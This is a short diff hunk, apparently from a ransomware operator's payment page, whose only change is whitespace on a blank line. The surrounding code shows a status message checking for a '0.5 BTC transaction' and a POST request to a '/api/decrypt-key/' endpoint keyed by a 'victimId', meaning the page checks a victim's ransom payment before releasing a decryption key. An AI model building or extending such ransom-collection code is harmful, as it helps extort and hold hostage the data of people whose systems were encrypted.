@@ -115,7 +115,7 @@
             status.style.display = 'block';
             status.style.color = '#ff9999';
             status.textContent = "Checking for 0.5 BTC transaction...";
-
+            
             try {
                 const response = await fetch(`/api/decrypt-key/${victimId}`, {
                     method: 'POST'
